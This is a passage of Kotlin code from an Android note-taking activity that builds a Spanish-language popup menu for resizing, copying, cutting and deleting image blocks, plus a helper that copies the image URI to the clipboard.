        val popup = android.widget.PopupMenu(this, anchor, android.view.Gravity.CENTER)

        // Agregar opciones
        popup.menu.add("Tamaño: 100% (Grande)")
        popup.menu.add("Tamaño: 75% (Mediano)")
        popup.menu.add("Tamaño: 50% (Pequeño)")
        popup.menu.add("Copiar")
        popup.menu.add("Cortar")
        popup.menu.add("Eliminar")

        popup.setOnMenuItemClickListener { item ->
            val block = noteBlocks[position]

            // CORRECCIÓN AQUÍ: Convertimos el título a String seguro para evitar errores de nulos
            val title = item.title.toString()

            if (block is NoteBlock.ImageBlock) {
                when {
                    title.contains("100%") -> {
                        block.widthPercentage = 100
                        blocksAdapter.notifyItemChanged(position)
                        true
                    }
                    title.contains("75%") -> {
                        block.widthPercentage = 75
                        blocksAdapter.notifyItemChanged(position)
                        true
                    }
                    title.contains("50%") -> {
                        block.widthPercentage = 50
                        blocksAdapter.notifyItemChanged(position)
                        true
                    }
                    title == "Copiar" -> {
                        copiarImagen(block.uri)
                        true
                    }
                    title == "Cortar" -> {
                        copiarImagen(block.uri)
                        noteBlocks.removeAt(position)
                        blocksAdapter.notifyItemRemoved(position)
                        Toast.makeText(this, "Imagen cortada", Toast.LENGTH_SHORT).show()
                        true
                    }
                    title == "Eliminar" -> {
                        noteBlocks.removeAt(position)
                        blocksAdapter.notifyItemRemoved(position)
                        true
                    }
                    else -> false
                }
            } else false
        }
        popup.show()
    }

    private fun copiarImagen(uriString: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = android.content.ClipData.newPlainText("Image URI", uriString)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, "Imagen copiada al portapapeles", Toast.LENGTH_SHORT).show()
    }
}